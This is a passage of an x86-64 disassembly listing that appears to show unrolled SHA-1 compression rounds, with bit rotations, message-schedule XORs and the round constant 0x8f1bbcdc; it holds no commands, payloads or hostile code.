  4058c4:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  4058cb:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4058d2:	48 c1 e0 1e          	shl    $0x1e,%rax
  4058d6:	48 89 c2             	mov    %rax,%rdx
  4058d9:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  4058e0:	89 c0                	mov    %eax,%eax
  4058e2:	48 c1 e8 02          	shr    $0x2,%rax
  4058e6:	48 09 d0             	or     %rdx,%rax
  4058e9:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  4058f0:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
  4058f4:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  4058f8:	48 31 c2             	xor    %rax,%rdx
  4058fb:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  4058ff:	48 31 c2             	xor    %rax,%rdx
  405902:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  405906:	48 31 d0             	xor    %rdx,%rax
  405909:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  405910:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405917:	48 c1 e0 05          	shl    $0x5,%rax
  40591b:	48 89 c2             	mov    %rax,%rdx
  40591e:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405925:	89 c0                	mov    %eax,%eax
  405927:	48 c1 e8 1b          	shr    $0x1b,%rax
  40592b:	48 89 d1             	mov    %rdx,%rcx
  40592e:	48 09 c1             	or     %rax,%rcx
  405931:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  405938:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  40593f:	48 89 d6             	mov    %rdx,%rsi
  405942:	48 21 c6             	and    %rax,%rsi
  405945:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  40594c:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  405953:	48 09 d0             	or     %rdx,%rax
  405956:	48 23 85 70 ff ff ff 	and    -0x90(%rbp),%rax
  40595d:	48 09 f0             	or     %rsi,%rax
  405960:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  405964:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40596b:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  40596f:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405976:	89 c0                	mov    %eax,%eax
  405978:	48 c1 e8 1f          	shr    $0x1f,%rax
  40597c:	48 09 c8             	or     %rcx,%rax
  40597f:	48 89 45 88          	mov    %rax,-0x78(%rbp)
  405983:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  405987:	48 01 c2             	add    %rax,%rdx
  40598a:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  405991:	48 01 c2             	add    %rax,%rdx
  405994:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  405999:	48 01 d0             	add    %rdx,%rax
  40599c:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  4059a3:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4059aa:	48 c1 e0 1e          	shl    $0x1e,%rax
  4059ae:	48 89 c2             	mov    %rax,%rdx
  4059b1:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4059b8:	89 c0                	mov    %eax,%eax
  4059ba:	48 c1 e8 02          	shr    $0x2,%rax
  4059be:	48 09 d0             	or     %rdx,%rax
  4059c1:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  4059c8:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
  4059cc:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  4059d0:	48 31 c2             	xor    %rax,%rdx
  4059d3:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  4059d7:	48 31 c2             	xor    %rax,%rdx
  4059da:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  4059de:	48 31 d0             	xor    %rdx,%rax
  4059e1:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  4059e8:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4059ef:	48 c1 e0 05          	shl    $0x5,%rax
  4059f3:	48 89 c2             	mov    %rax,%rdx
  4059f6:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  4059fd:	89 c0                	mov    %eax,%eax
  4059ff:	48 c1 e8 1b          	shr    $0x1b,%rax
  405a03:	48 89 d1             	mov    %rdx,%rcx
  405a06:	48 09 c1             	or     %rax,%rcx
  405a09:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  405a10:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  405a17:	48 89 d6             	mov    %rdx,%rsi
  405a1a:	48 21 c6             	and    %rax,%rsi
  405a1d:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  405a24:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  405a2b:	48 09 d0             	or     %rdx,%rax
  405a2e:	48 23 85 68 ff ff ff 	and    -0x98(%rbp),%rax
  405a35:	48 09 f0             	or     %rsi,%rax
  405a38:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  405a3c:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405a43:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  405a47:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405a4e:	89 c0                	mov    %eax,%eax
  405a50:	48 c1 e8 1f          	shr    $0x1f,%rax
  405a54:	48 09 c8             	or     %rcx,%rax
  405a57:	48 89 45 90          	mov    %rax,-0x70(%rbp)
  405a5b:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  405a5f:	48 01 c2             	add    %rax,%rdx
  405a62:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405a69:	48 01 c2             	add    %rax,%rdx
  405a6c:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  405a71:	48 01 d0             	add    %rdx,%rax
  405a74:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  405a7b:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405a82:	48 c1 e0 1e          	shl    $0x1e,%rax
  405a86:	48 89 c2             	mov    %rax,%rdx
  405a89:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405a90:	89 c0                	mov    %eax,%eax
  405a92:	48 c1 e8 02          	shr    $0x2,%rax
  405a96:	48 09 d0             	or     %rdx,%rax
  405a99:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  405aa0:	48 8b 55 80          	mov    -0x80(%rbp),%rdx
  405aa4:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  405aa8:	48 31 c2             	xor    %rax,%rdx
  405aab:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  405aaf:	48 31 c2             	xor    %rax,%rdx
  405ab2:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  405ab6:	48 31 d0             	xor    %rdx,%rax
  405ab9:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  405ac0:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405ac7:	48 c1 e0 05          	shl    $0x5,%rax
  405acb:	48 89 c2             	mov    %rax,%rdx
  405ace:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405ad5:	89 c0                	mov    %eax,%eax
  405ad7:	48 c1 e8 1b          	shr    $0x1b,%rax
  405adb:	48 89 d1             	mov    %rdx,%rcx
  405ade:	48 09 c1             	or     %rax,%rcx
  405ae1:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405ae8:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  405aef:	48 89 d6             	mov    %rdx,%rsi
  405af2:	48 21 c6             	and    %rax,%rsi
  405af5:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405afc:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  405b03:	48 09 d0             	or     %rdx,%rax
  405b06:	48 23 85 60 ff ff ff 	and    -0xa0(%rbp),%rax
  405b0d:	48 09 f0             	or     %rsi,%rax
  405b10:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  405b14:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405b1b:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  405b1f:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405b26:	89 c0                	mov    %eax,%eax
  405b28:	48 c1 e8 1f          	shr    $0x1f,%rax
  405b2c:	48 09 c8             	or     %rcx,%rax
  405b2f:	48 89 45 98          	mov    %rax,-0x68(%rbp)
  405b33:	48 8b 45 98          	mov    -0x68(%rbp),%rax
  405b37:	48 01 c2             	add    %rax,%rdx
  405b3a:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  405b41:	48 01 c2             	add    %rax,%rdx
  405b44:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  405b49:	48 01 d0             	add    %rdx,%rax
  405b4c:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  405b53:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  405b5a:	48 c1 e0 1e          	shl    $0x1e,%rax
  405b5e:	48 89 c2             	mov    %rax,%rdx
  405b61:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  405b68:	89 c0                	mov    %eax,%eax
  405b6a:	48 c1 e8 02          	shr    $0x2,%rax
  405b6e:	48 09 d0             	or     %rdx,%rax
  405b71:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  405b78:	48 8b 55 88          	mov    -0x78(%rbp),%rdx
  405b7c:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  405b80:	48 31 c2             	xor    %rax,%rdx
  405b83:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  405b87:	48 31 c2             	xor    %rax,%rdx
  405b8a:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  405b8e:	48 31 d0             	xor    %rdx,%rax
  405b91:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  405b98:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  405b9f:	48 c1 e0 05          	shl    $0x5,%rax
  405ba3:	48 89 c2             	mov    %rax,%rdx
  405ba6:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  405bad:	89 c0                	mov    %eax,%eax
  405baf:	48 c1 e8 1b          	shr    $0x1b,%rax
  405bb3:	48 89 d1             	mov    %rdx,%rcx
  405bb6:	48 09 c1             	or     %rax,%rcx
  405bb9:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  405bc0:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  405bc7:	48 89 d6             	mov    %rdx,%rsi
  405bca:	48 21 c6             	and    %rax,%rsi
  405bcd:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  405bd4:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  405bdb:	48 09 d0             	or     %rdx,%rax
  405bde:	48 23 85 58 ff ff ff 	and    -0xa8(%rbp),%rax
  405be5:	48 09 f0             	or     %rsi,%rax
  405be8:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  405bec:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405bf3:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  405bf7:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405bfe:	89 c0                	mov    %eax,%eax
  405c00:	48 c1 e8 1f          	shr    $0x1f,%rax
  405c04:	48 09 c8             	or     %rcx,%rax
  405c07:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
  405c0b:	48 8b 45 a0          	mov    -0x60(%rbp),%rax
  405c0f:	48 01 c2             	add    %rax,%rdx
  405c12:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  405c19:	48 01 c2             	add    %rax,%rdx
  405c1c:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  405c21:	48 01 d0             	add    %rdx,%rax
  405c24:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  405c2b:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405c32:	48 c1 e0 1e          	shl    $0x1e,%rax
  405c36:	48 89 c2             	mov    %rax,%rdx
  405c39:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405c40:	89 c0                	mov    %eax,%eax
  405c42:	48 c1 e8 02          	shr    $0x2,%rax
  405c46:	48 09 d0             	or     %rdx,%rax
  405c49:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  405c50:	48 8b 55 90          	mov    -0x70(%rbp),%rdx
  405c54:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
  405c58:	48 31 c2             	xor    %rax,%rdx
  405c5b:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  405c5f:	48 31 c2             	xor    %rax,%rdx
  405c62:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  405c66:	48 31 d0             	xor    %rdx,%rax
  405c69:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  405c70:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  405c77:	48 c1 e0 05          	shl    $0x5,%rax
  405c7b:	48 89 c2             	mov    %rax,%rdx
  405c7e:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  405c85:	89 c0                	mov    %eax,%eax
  405c87:	48 c1 e8 1b          	shr    $0x1b,%rax
  405c8b:	48 89 d1             	mov    %rdx,%rcx
  405c8e:	48 09 c1             	or     %rax,%rcx
  405c91:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405c98:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  405c9f:	48 89 d6             	mov    %rdx,%rsi
  405ca2:	48 21 c6             	and    %rax,%rsi
  405ca5:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405cac:	48 8b 95 68 ff ff ff 	mov    -0x98(%rbp),%rdx
  405cb3:	48 09 d0             	or     %rdx,%rax
  405cb6:	48 23 85 50 ff ff ff 	and    -0xb0(%rbp),%rax
  405cbd:	48 09 f0             	or     %rsi,%rax
  405cc0:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  405cc4:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405ccb:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  405ccf:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405cd6:	89 c0                	mov    %eax,%eax
  405cd8:	48 c1 e8 1f          	shr    $0x1f,%rax
  405cdc:	48 09 c8             	or     %rcx,%rax
  405cdf:	48 89 45 a8          	mov    %rax,-0x58(%rbp)
  405ce3:	48 8b 45 a8          	mov    -0x58(%rbp),%rax
  405ce7:	48 01 c2             	add    %rax,%rdx
  405cea:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405cf1:	48 01 c2             	add    %rax,%rdx
  405cf4:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  405cf9:	48 01 d0             	add    %rdx,%rax
  405cfc:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  405d03:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  405d0a:	48 c1 e0 1e          	shl    $0x1e,%rax
  405d0e:	48 89 c2             	mov    %rax,%rdx
  405d11:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  405d18:	89 c0                	mov    %eax,%eax
  405d1a:	48 c1 e8 02          	shr    $0x2,%rax
  405d1e:	48 09 d0             	or     %rdx,%rax
  405d21:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  405d28:	48 8b 55 98          	mov    -0x68(%rbp),%rdx
  405d2c:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  405d30:	48 31 c2             	xor    %rax,%rdx
  405d33:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  405d37:	48 31 c2             	xor    %rax,%rdx
  405d3a:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  405d3e:	48 31 d0             	xor    %rdx,%rax
  405d41:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  405d48:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405d4f:	48 c1 e0 05          	shl    $0x5,%rax
  405d53:	48 89 c2             	mov    %rax,%rdx
  405d56:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405d5d:	89 c0                	mov    %eax,%eax
  405d5f:	48 c1 e8 1b          	shr    $0x1b,%rax
  405d63:	48 89 d1             	mov    %rdx,%rcx
  405d66:	48 09 c1             	or     %rax,%rcx
  405d69:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  405d70:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  405d77:	48 89 d6             	mov    %rdx,%rsi
  405d7a:	48 21 c6             	and    %rax,%rsi
  405d7d:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  405d84:	48 8b 95 60 ff ff ff 	mov    -0xa0(%rbp),%rdx
  405d8b:	48 09 d0             	or     %rdx,%rax
  405d8e:	48 23 85 70 ff ff ff 	and    -0x90(%rbp),%rax
  405d95:	48 09 f0             	or     %rsi,%rax
  405d98:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  405d9c:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405da3:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  405da7:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405dae:	89 c0                	mov    %eax,%eax
  405db0:	48 c1 e8 1f          	shr    $0x1f,%rax
  405db4:	48 09 c8             	or     %rcx,%rax
  405db7:	48 89 45 b0          	mov    %rax,-0x50(%rbp)
  405dbb:	48 8b 45 b0          	mov    -0x50(%rbp),%rax
  405dbf:	48 01 c2             	add    %rax,%rdx
  405dc2:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  405dc9:	48 01 c2             	add    %rax,%rdx
  405dcc:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  405dd1:	48 01 d0             	add    %rdx,%rax
  405dd4:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  405ddb:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  405de2:	48 c1 e0 1e          	shl    $0x1e,%rax
  405de6:	48 89 c2             	mov    %rax,%rdx
  405de9:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  405df0:	89 c0                	mov    %eax,%eax
  405df2:	48 c1 e8 02          	shr    $0x2,%rax
  405df6:	48 09 d0             	or     %rdx,%rax
  405df9:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  405e00:	48 8b 55 a0          	mov    -0x60(%rbp),%rdx
  405e04:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  405e08:	48 31 c2             	xor    %rax,%rdx
  405e0b:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  405e0f:	48 31 c2             	xor    %rax,%rdx
  405e12:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  405e16:	48 31 d0             	xor    %rdx,%rax
  405e19:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  405e20:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  405e27:	48 c1 e0 05          	shl    $0x5,%rax
  405e2b:	48 89 c2             	mov    %rax,%rdx
  405e2e:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  405e35:	89 c0                	mov    %eax,%eax
  405e37:	48 c1 e8 1b          	shr    $0x1b,%rax
  405e3b:	48 89 d1             	mov    %rdx,%rcx
  405e3e:	48 09 c1             	or     %rax,%rcx
  405e41:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  405e48:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  405e4f:	48 89 d6             	mov    %rdx,%rsi
  405e52:	48 21 c6             	and    %rax,%rsi
  405e55:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  405e5c:	48 8b 95 58 ff ff ff 	mov    -0xa8(%rbp),%rdx
  405e63:	48 09 d0             	or     %rdx,%rax
  405e66:	48 23 85 68 ff ff ff 	and    -0x98(%rbp),%rax
  405e6d:	48 09 f0             	or     %rsi,%rax
  405e70:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  405e74:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405e7b:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  405e7f:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405e86:	89 c0                	mov    %eax,%eax
  405e88:	48 c1 e8 1f          	shr    $0x1f,%rax
  405e8c:	48 09 c8             	or     %rcx,%rax
  405e8f:	48 89 45 b8          	mov    %rax,-0x48(%rbp)
  405e93:	48 8b 45 b8          	mov    -0x48(%rbp),%rax
  405e97:	48 01 c2             	add    %rax,%rdx
  405e9a:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405ea1:	48 01 c2             	add    %rax,%rdx
  405ea4:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  405ea9:	48 01 d0             	add    %rdx,%rax
  405eac:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  405eb3:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405eba:	48 c1 e0 1e          	shl    $0x1e,%rax
  405ebe:	48 89 c2             	mov    %rax,%rdx
  405ec1:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405ec8:	89 c0                	mov    %eax,%eax
  405eca:	48 c1 e8 02          	shr    $0x2,%rax
  405ece:	48 09 d0             	or     %rdx,%rax
  405ed1:	48 89 85 58 ff ff ff 	mov    %rax,-0xa8(%rbp)
  405ed8:	48 8b 55 a8          	mov    -0x58(%rbp),%rdx
  405edc:	48 8b 45 80          	mov    -0x80(%rbp),%rax
  405ee0:	48 31 c2             	xor    %rax,%rdx
  405ee3:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  405ee7:	48 31 c2             	xor    %rax,%rdx
  405eea:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  405eee:	48 31 d0             	xor    %rdx,%rax
  405ef1:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  405ef8:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405eff:	48 c1 e0 05          	shl    $0x5,%rax
  405f03:	48 89 c2             	mov    %rax,%rdx
  405f06:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  405f0d:	89 c0                	mov    %eax,%eax
  405f0f:	48 c1 e8 1b          	shr    $0x1b,%rax
  405f13:	48 89 d1             	mov    %rdx,%rcx
  405f16:	48 09 c1             	or     %rax,%rcx
  405f19:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405f20:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  405f27:	48 89 d6             	mov    %rdx,%rsi
  405f2a:	48 21 c6             	and    %rax,%rsi
  405f2d:	48 8b 85 58 ff ff ff 	mov    -0xa8(%rbp),%rax
  405f34:	48 8b 95 50 ff ff ff 	mov    -0xb0(%rbp),%rdx
  405f3b:	48 09 d0             	or     %rdx,%rax
  405f3e:	48 23 85 60 ff ff ff 	and    -0xa0(%rbp),%rax
  405f45:	48 09 f0             	or     %rsi,%rax
  405f48:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  405f4c:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405f53:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  405f57:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  405f5e:	89 c0                	mov    %eax,%eax
  405f60:	48 c1 e8 1f          	shr    $0x1f,%rax
  405f64:	48 09 c8             	or     %rcx,%rax
  405f67:	48 89 45 c0          	mov    %rax,-0x40(%rbp)
  405f6b:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  405f6f:	48 01 c2             	add    %rax,%rdx
  405f72:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  405f79:	48 01 c2             	add    %rax,%rdx
  405f7c:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  405f81:	48 01 d0             	add    %rdx,%rax
  405f84:	48 89 85 68 ff ff ff 	mov    %rax,-0x98(%rbp)
  405f8b:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  405f92:	48 c1 e0 1e          	shl    $0x1e,%rax
  405f96:	48 89 c2             	mov    %rax,%rdx
  405f99:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  405fa0:	89 c0                	mov    %eax,%eax
  405fa2:	48 c1 e8 02          	shr    $0x2,%rax
  405fa6:	48 09 d0             	or     %rdx,%rax
  405fa9:	48 89 85 50 ff ff ff 	mov    %rax,-0xb0(%rbp)
  405fb0:	48 8b 55 b0          	mov    -0x50(%rbp),%rdx
  405fb4:	48 8b 45 88          	mov    -0x78(%rbp),%rax
  405fb8:	48 31 c2             	xor    %rax,%rdx
  405fbb:	48 8b 45 d8          	mov    -0x28(%rbp),%rax
  405fbf:	48 31 c2             	xor    %rax,%rdx
  405fc2:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  405fc6:	48 31 d0             	xor    %rdx,%rax
  405fc9:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  405fd0:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  405fd7:	48 c1 e0 05          	shl    $0x5,%rax
  405fdb:	48 89 c2             	mov    %rax,%rdx
  405fde:	48 8b 85 68 ff ff ff 	mov    -0x98(%rbp),%rax
  405fe5:	89 c0                	mov    %eax,%eax
  405fe7:	48 c1 e8 1b          	shr    $0x1b,%rax
  405feb:	48 89 d1             	mov    %rdx,%rcx
  405fee:	48 09 c1             	or     %rax,%rcx
  405ff1:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  405ff8:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  405fff:	48 89 d6             	mov    %rdx,%rsi
  406002:	48 21 c6             	and    %rax,%rsi
  406005:	48 8b 85 50 ff ff ff 	mov    -0xb0(%rbp),%rax
  40600c:	48 8b 95 70 ff ff ff 	mov    -0x90(%rbp),%rdx
  406013:	48 09 d0             	or     %rdx,%rax
  406016:	48 23 85 58 ff ff ff 	and    -0xa8(%rbp),%rax
  40601d:	48 09 f0             	or     %rsi,%rax
  406020:	48 8d 14 01          	lea    (%rcx,%rax,1),%rdx
  406024:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  40602b:	48 8d 0c 00          	lea    (%rax,%rax,1),%rcx
  40602f:	48 8b 85 78 ff ff ff 	mov    -0x88(%rbp),%rax
  406036:	89 c0                	mov    %eax,%eax
  406038:	48 c1 e8 1f          	shr    $0x1f,%rax
  40603c:	48 09 c8             	or     %rcx,%rax
  40603f:	48 89 45 c8          	mov    %rax,-0x38(%rbp)
  406043:	48 8b 45 c8          	mov    -0x38(%rbp),%rax
  406047:	48 01 c2             	add    %rax,%rdx
  40604a:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  406051:	48 01 c2             	add    %rax,%rdx
  406054:	b8 dc bc 1b 8f       	mov    $0x8f1bbcdc,%eax
  406059:	48 01 d0             	add    %rdx,%rax
  40605c:	48 89 85 60 ff ff ff 	mov    %rax,-0xa0(%rbp)
  406063:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  40606a:	48 c1 e0 1e          	shl    $0x1e,%rax
  40606e:	48 89 c2             	mov    %rax,%rdx
  406071:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
  406078:	89 c0                	mov    %eax,%eax
  40607a:	48 c1 e8 02          	shr    $0x2,%rax
  40607e:	48 09 d0             	or     %rdx,%rax
  406081:	48 89 85 70 ff ff ff 	mov    %rax,-0x90(%rbp)
  406088:	48 8b 55 b8          	mov    -0x48(%rbp),%rdx
  40608c:	48 8b 45 90          	mov    -0x70(%rbp),%rax
  406090:	48 31 c2             	xor    %rax,%rdx
  406093:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
  406097:	48 31 c2             	xor    %rax,%rdx
  40609a:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
  40609e:	48 31 d0             	xor    %rdx,%rax
  4060a1:	48 89 85 78 ff ff ff 	mov    %rax,-0x88(%rbp)
  4060a8:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4060af:	48 c1 e0 05          	shl    $0x5,%rax
  4060b3:	48 89 c2             	mov    %rax,%rdx
  4060b6:	48 8b 85 60 ff ff ff 	mov    -0xa0(%rbp),%rax
  4060bd:	89 c0                	mov    %eax,%eax
  4060bf:	48 c1 e8 1b          	shr    $0x1b,%rax
  4060c3:	48 89 d1             	mov    %rdx,%rcx
  4060c6:	48 09 c1             	or     %rax,%rcx
  4060c9:	48 8b 85 70 ff ff ff 	mov    -0x90(%rbp),%rax
